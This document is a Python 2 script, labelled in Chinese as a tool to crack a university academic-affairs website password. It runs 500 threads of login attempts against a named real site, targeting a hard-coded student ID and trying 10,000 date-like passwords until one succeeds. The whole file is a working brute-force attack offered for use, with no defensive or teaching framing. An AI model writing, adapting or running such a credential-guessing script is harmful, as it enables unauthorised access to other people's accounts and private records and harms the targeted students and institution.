# -*- coding:utf-8 -*-
# 破解教务网密码
# 作者：华亮

from HTMLParser import HTMLParser
from Queue import Empty
from Queue import Queue
from re import match
from sys import exit
from urllib import urlencode
import os
import re
import socket
import threading
import time
import urllib
import urllib2
import shelve

'''

http://jw2005.scuteo.com/(ia032y45hn3tn2m2ezxkt0ia)/default2.aspx


__VIEWSTATE:dDwtMTAzOTYzNjY2ODs7Pit1kfqVxl1q5R4HRuA4VpYXKQd6
TextBox1:200930633044
TextBox2:afsdfdsfdsfsdfds
RadioButtonList1:%D1%A7%C9%FA (unable to decode value)
Button1:
lbLanguage:


dDwtMTAzOTYzNjY2ODs7Pit1kfqVxl1q5R4HRuA4VpYXKQd6
'''

GlobalPrintMutex = threading.Lock()

queue = Queue()

month = '08'
remain = 0

id = '200930635468'

def connect(id, password):
    global queue, stop
    loginData = {'__VIEWSTATE':'dDwtMTAzOTYzNjY2ODs7Pit1kfqVxl1q5R4HRuA4VpYXKQd6',
        'TextBox1':id,
        'TextBox2':password,
        'RadioButtonList1':'%D1%A7%C9%FA',
        'Button1':'',
        'lbLanguage':''}
    
    postData = urlencode(loginData)
    
    req = urllib2.Request('http://jw2005.scuteo.com/(ia032y45hn3tn2m2ezxkt0ia)/default2.aspx')
    req.add_header('Origin', 'http://jw2005.scuteo.com')
    req.add_header('Referer', 'http://jw2005.scuteo.com/(ia032y45hn3tn2m2ezxkt0ia)/default2.aspx')
    req.add_data(postData)
    
    try:    
        cookieFile = urllib2.HTTPCookieProcessor()
        opener = urllib2.build_opener(cookieFile)  
        result = opener.open(req)       
        return result.read().find('alert') <= 0
    except:
        if not stop:
            queue.put(password)
            GlobalPrintMutex.acquire()
            print password, "Failed"
            GlobalPrintMutex.release()    
            
    
    return False
    

stop = False

class Tester(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        
    def run(self):
        global queue, id, stop
        
        while 1: 
            try:           
                password = queue.get()                                
            except Empty:
                Sleep(1)
                continue
             
            if connect(id, password):
                stop = True
                GlobalPrintMutex.acquire()
                print '+' * 200
                print password
                print '+' * 200
                GlobalPrintMutex.release()  
                exit()                  
            
            if stop:
                #print '+' * 100
                return 
            else:
                GlobalPrintMutex.acquire()
                print queue.qsize(), ": ", password
                GlobalPrintMutex.release()   
                      
       
        


def main():
    global queue
    for i in range(0, 10000):
        password = month + ('%4d' % i).replace(' ','0')   
        queue.put(password)    
    
    threads = []
    for i in range(500):
        test = Tester()
        test.start()
        threads.append(test)
        
    for thread in threads:
        thread.join()
        


if __name__ == '__main__':
    main()
